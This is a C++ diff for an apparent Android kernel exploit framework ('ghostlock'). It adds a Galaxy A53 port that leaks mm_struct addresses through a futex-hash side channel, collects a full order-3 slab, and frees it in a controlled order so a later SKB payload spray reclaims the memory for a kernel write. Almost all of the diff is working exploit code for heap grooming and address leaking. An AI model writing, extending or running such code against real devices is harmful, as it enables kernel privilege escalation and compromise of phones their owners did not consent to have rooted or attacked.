@@ -1,11 +1,19 @@
 #include "common.h"
 #include "kernel/runtime_struct_offsets.h"
 
+#include <algorithm>
 #include <array>
+#include <cstdint>
+#include <cstdio>
+#include <memory>
 #include <string_view>
+#include <vector>
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
 #include "support/native_resource.hpp"
+#if defined(GHOSTLOCK_TARGET_A53_5_10)
+#include "support/a53_reclaim.hpp"
+#endif
 #include "kernel/target.h"
 #include "kernelsnitch/kernelsnitch.h"
 
@@ -474,6 +482,286 @@ namespace ghostlock::support {
      * syscall-level fault-injection framework; the ownership refactor itself is
      * complete (CPP12h). Completion: add the framework, cover the early-exit
      * paths, then delete this comment and the residual row. */
+
+#if defined(GHOSTLOCK_TARGET_A53_5_10)
+/* --- A53 mm_struct reclaim ------------------------------------------------
+ *
+ * Ported from Root-My-Galaxy-Payloads
+ * src/targets/a53x-A536EXXSNGZG3/page.c. Two behaviours there are what make
+ * the leak reliable on this SoC, and neither exists in the generic path:
+ *
+ *  1. A single leaked mm_struct is not enough. The target has to be a whole
+ *     order-3 slab, every object of which resolves under all collision futexes
+ *     -- the group hunt keeps re-running until it holds ORDER3_SIZE /
+ *     MM_STRUCT_SZ of them, grouped by slab base.
+ *
+ *  2. The slab only becomes reclaimable under drain pressure. Pin
+ *     A53_TRIGGER_SLABS * batch extra references, release all but the last
+ *     target reference, wait, and only then free the tail -- so the SLUB free
+ *     actually lands where the later scan looks.
+ *
+ * DMA32 candidates are held and discarded rather than used: upstream documents
+ * that they do not reclaim into the SKB allocation path on this device.
+ *
+ * src/core/kernelsnitch/ is untouched; everything here goes through the
+ * public context_* API that page.c's staged C calls map onto. It lives in this
+ * translation unit because kernelsnitch.h defines print_state/print_collisions
+ * non-inline, so it cannot be included by a second TU.
+ * See docs/development/a53-reclaim-port-plan.md.
+ */
+
+namespace a53_reclaim {
+
+/* Upper bound on slab groups tracked while hunting, mirroring upstream's
+ * max_groups. Well above the number observed in practice. */
+constexpr size_t kMaxGroups = 64;
+
+/* page.c's zone_of(): which physmap window a slab base falls in. Only the
+ * normal window is usable on this device. */
+enum class MmZone { Invalid, Dma32, Normal };
+
+MmZone zone_of(uintptr_t mm) {
+    const uintptr_t base = mm & ~(kernel::ORDER3_SIZE - 1);
+    if (base >= kernel::A53_DMA32_ALIAS_START && base < kernel::A53_DMA32_ALIAS_END) {
+        return MmZone::Dma32;
+    }
+    if (base >= kernel::A53_NORMAL_ALIAS_START && base < kernel::A53_NORMAL_ALIAS_END) {
+        return MmZone::Normal;
+    }
+    return MmZone::Invalid;
+}
+
+bool valid_normal_mm(uintptr_t mm, size_t mm_struct_sz, size_t batch) {
+    if (zone_of(mm) != MmZone::Normal) {
+        return false;
+    }
+    const uintptr_t base = mm & ~(kernel::ORDER3_SIZE - 1);
+    const uintptr_t offset = mm - base;
+    return offset < kernel::ORDER3_SIZE && offset % mm_struct_sz == 0 && batch > 0 &&
+           offset / mm_struct_sz < batch;
+}
+
+/* The canonical mm_struct of the slab at `base`, or -1.
+ *
+ * Equivalent to page.c's match_page(): a candidate counts only when its futex
+ * bucket is identical under every collision address. Requiring exactly one
+ * match across the slab keeps a partially-reclaimed slab from being accepted. */
+uintptr_t match_page(kernelsnitch::KernelSnitchContext *ks, uintptr_t base, size_t mm_struct_sz,
+                     size_t batch) {
+    uintptr_t found = static_cast<uintptr_t>(-1);
+    size_t count = 0;
+    for (size_t slot = 0; slot < batch; slot++) {
+        const uintptr_t candidate = base + slot * mm_struct_sz;
+        const size_t bucket = kernelsnitch::futex_hash_context_bucket(
+                &ks->futex_hash, ks->futex_addrs[0], candidate);
+        bool all = true;
+        for (size_t i = 1; i < ks->collisions; i++) {
+            if (kernelsnitch::futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[i], candidate) !=
+                bucket) {
+                all = false;
+                break;
+            }
+        }
+        if (all) {
+            found = candidate;
+            count++;
+        }
+    }
+    /* The tag nibble replaces bits 56-59; restore the canonical VA. */
+    return count == 1 ? (found | (static_cast<uintptr_t>(0xf) << 56)) : static_cast<uintptr_t>(-1);
+}
+
+/* One hunt: set up a context, find collisions in a child, then brute-force.
+ *
+ * With a confirmed slab base in hand the hint path runs, which needs only two
+ * collisions and a match test instead of a full scan. A hint that stops
+ * matching falls back to the general four-collision hunt next round.
+ *
+ * Returns the held memfd on success, -2 when no usable mm was found, and -3
+ * when the hint went stale. */
+int32_t leak_mm(size_t cpu_count, uintptr_t hint, size_t mm_struct_sz, size_t mm_slab_order,
+                size_t batch, uintptr_t *mm_out) {
+    const size_t collisions = hint ? 2 : 4;
+    kernelsnitch::KernelSnitchOwner ks = kernelsnitch::KernelSnitchOwner::create(
+            mm_struct_sz, mm_slab_order, cpu_count, collisions, 0, 0);
+    if (!ks.get()) {
+        return -2;
+    }
+    const pid_t child = clone_leak_child();
+    if (child <= 0 || !ks.has_collisions()) {
+        return -2;
+    }
+    if (hint) {
+        const uintptr_t hit = match_page(ks.get(), hint, mm_struct_sz, batch);
+        if (hit == static_cast<uintptr_t>(-1)) {
+            return -3;
+        }
+        *mm_out = hit;
+    } else if (ks.scan() != 0) {
+        return -2;
+    } else {
+        *mm_out = ks.result();
+    }
+    return clone_memfd();
+}
+
+} // namespace a53_reclaim
+
+std::size_t a53_mm_objs_per_slab(std::size_t mm_struct_sz) noexcept {
+    return mm_struct_sz ? kernel::ORDER3_SIZE / mm_struct_sz : 0;
+}
+
+bool a53_valid_normal_mm(std::uintptr_t mm, std::size_t mm_struct_sz, std::size_t batch) noexcept {
+    return a53_reclaim::valid_normal_mm(mm, mm_struct_sz, batch);
+}
+
+bool a53_collect_full_group(std::size_t cpu_count, std::size_t mm_struct_sz, std::size_t mm_slab_order,
+                            A53ReclaimGroup *group) noexcept {
+    if (!group || !mm_struct_sz) {
+        return false;
+    }
+    const size_t batch = a53_mm_objs_per_slab(mm_struct_sz);
+    if (!batch) {
+        return false;
+    }
+    /* References we pin and then discard rather than use. Holding a DMA32
+     * candidate for a while keeps it from being freed and recycled underneath
+     * the hunt while we look for a normal-zone slab instead. */
+    const size_t dma32_refs = kernel::A53_DMA32_SKIP_SLABS * batch;
+    std::vector<int32_t> opaque;
+    std::vector<uintptr_t> bases;
+    std::vector<size_t> counts;
+    std::vector<int32_t> fds(a53_reclaim::kMaxGroups * batch, -1);
+    std::vector<unsigned char> seen(a53_reclaim::kMaxGroups * batch, 0);
+    size_t group_count = 0;
+    size_t chosen = a53_reclaim::kMaxGroups;
+    uintptr_t hint = 0;
+
+    for (unsigned long attempt = 1; attempt <= kernel::A53_PAGE_SCAN_MAX; attempt++) {
+        uintptr_t mm = 0;
+        const int32_t fd = a53_reclaim::leak_mm(cpu_count, hint, mm_struct_sz, mm_slab_order, batch, &mm);
+        if (fd == -3) {
+            /* Hint went stale: fall back to the general hunt next round. */
+            hint = 0;
+            continue;
+        }
+        if (fd < 0) {
+            continue;
+        }
+        if (!a53_valid_normal_mm(mm, mm_struct_sz, batch)) {
+            /* DMA32, or a slot outside the slab: hold briefly, then drop. */
+            SYSCHK(close(fd));
+            for (size_t i = 1; i < dma32_refs; i++) {
+                opaque.push_back(clone_memfd());
+            }
+            hint = 0;
+            continue;
+        }
+        const uintptr_t base = mm & ~(kernel::ORDER3_SIZE - 1);
+        hint = base;
+        size_t slot_index = a53_reclaim::kMaxGroups;
+        for (size_t i = 0; i < group_count; i++) {
+            if (bases[i] == base) {
+                slot_index = i;
+                break;
+            }
+        }
+        if (slot_index == a53_reclaim::kMaxGroups && group_count < a53_reclaim::kMaxGroups) {
+            slot_index = group_count++;
+            bases.push_back(base);
+            counts.push_back(0);
+        }
+        if (slot_index == a53_reclaim::kMaxGroups) {
+            SYSCHK(close(fd));
+            hint = 0;
+            continue;
+        }
+        const size_t slot = (mm - base) / mm_struct_sz;
+        const size_t flat = slot_index * batch + slot;
+        if (seen[flat]) {
+            /* Same object twice: hold it so it is not recycled, keep hunting. */
+            opaque.push_back(fd);
+            hint = 0;
+            continue;
+        }
+        seen[flat] = 1;
+        fds[flat] = fd;
+        counts[slot_index]++;
+        if (counts[slot_index] == batch) {
+            chosen = slot_index;
+            break;
+        }
+    }
+
+    /* Release everything that is not the chosen group. */
+    for (size_t g = 0; g < group_count; g++) {
+        for (size_t slot = 0; slot < batch; slot++) {
+            const int32_t fd = fds[g * batch + slot];
+            if (fd >= 0 && !(chosen != a53_reclaim::kMaxGroups && g == chosen)) {
+                SYSCHK(close(fd));
+                fds[g * batch + slot] = -1;
+            }
+        }
+    }
+    for (const int32_t fd : opaque) {
+        SYSCHK(close(fd));
+    }
+    if (chosen == a53_reclaim::kMaxGroups) {
+        return false;
+    }
+
+    auto held = std::make_unique<int32_t[]>(batch);
+    for (size_t slot = 0; slot < batch; slot++) {
+        held[slot] = fds[chosen * batch + slot];
+    }
+    pr_info("A53_GROUP_SELECTED base=0x%016zx zone=normal objects=%zu attempts=%lu\n",
+            bases[chosen], batch, static_cast<unsigned long>(kernel::A53_PAGE_SCAN_MAX));
+    group->base = bases[chosen];
+    group->held = held.release();
+    group->held_len = batch;
+    group->batch = batch;
+    group->complete = true;
+    return true;
+}
+
+void a53_drain_group(A53ReclaimGroup *group) noexcept {
+    if (!group || !group->held || !group->batch) {
+        return;
+    }
+    const size_t batch = group->batch;
+    const size_t trigger_refs = kernel::A53_TRIGGER_SLABS * batch;
+    std::vector<int32_t> triggers;
+    triggers.reserve(trigger_refs);
+    kernel::pin_to_core(0);
+    /* Drain pressure: these extra references keep the reclaim from resolving
+     * while the target references are released in order. */
+    for (size_t i = 0; i < trigger_refs; i++) {
+        triggers.push_back(clone_memfd());
+    }
+    pr_info("A53_TRIGGER_READY slabs=%lu refs=%zu\n",
+            static_cast<unsigned long>(kernel::A53_TRIGGER_SLABS), trigger_refs);
+    /* All but the tail, let the slab settle, one reference per trigger batch,
+     * then the tail. */
+    for (size_t i = 0; i + 1 < batch; i++) {
+        SYSCHK(close(group->held[i]));
+        group->held[i] = -1;
+    }
+    usleep(1000 * 1000);
+    for (size_t page = 0; page < kernel::A53_TRIGGER_SLABS; page++) {
+        const size_t idx = page * batch;
+        if (idx < triggers.size()) {
+            SYSCHK(close(triggers[idx]));
+        }
+    }
+    SYSCHK(close(group->held[batch - 1]));
+    group->held[batch - 1] = -1;
+    pr_info("A53_TARGET_TAIL_FREE batch=%zu\n", batch);
+    delete[] group->held;
+    group->held = nullptr;
+    group->held_len = 0;
+}
+#endif /* GHOSTLOCK_TARGET_A53_5_10 */
+
     uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
@@ -598,6 +886,34 @@ namespace ghostlock::support {
 
         pr_info("[spray] futex collisions found +%lldms\n",
                 ms_since(&t_spray));
+#if defined(GHOSTLOCK_TARGET_A53_5_10)
+        /* One leaked mm_struct is not enough here: the whole order-3 slab has
+         * to come back under drain pressure, or the SKB reuse never lands on it.
+         * a53_collect_full_group() hunts for a complete normal-zone slab and
+         * a53_drain_group() releases it in the order that actually frees it. */
+        A53ReclaimGroup group{};
+        const size_t mm_stride =
+                session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
+        const bool grouped =
+                mm_stride &&
+                a53_collect_full_group(
+                        static_cast<size_t>(cpu_count), mm_stride, kernel::MM_ORDER, &group);
+        uintptr_t base = grouped ? group.base : 0;
+        (session::g_exploit_session.heap.current.last_mm_struct) = base;
+        if (!grouped) {
+            pr_warning("A53_GROUP_NONE zone=normal scan=%u\n",
+                    static_cast<unsigned>(kernel::A53_PAGE_SCAN_MAX));
+            snitch.reset();
+            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
+                kill_child(prepare_ctx.childs[i]);
+            }
+            cleanup_page_prepare_state();
+            return 0;
+        }
+        a53_drain_group(&group);
+        pr_info("[spray] a53 group freed base=0x%016zx objects=%zu +%lldms\n", base,
+                group.batch, ms_since(&t_spray));
+#else
         (void) snitch.scan();
         pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
                 snitch.result(), ms_since(&t_spray));
@@ -619,6 +935,7 @@ namespace ghostlock::support {
         }
 
         uintptr_t base = leaked & ~(kernel::ORDER3_SIZE - 1);
+#endif
         if (!prepare_skb_payload(base, request)) {
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
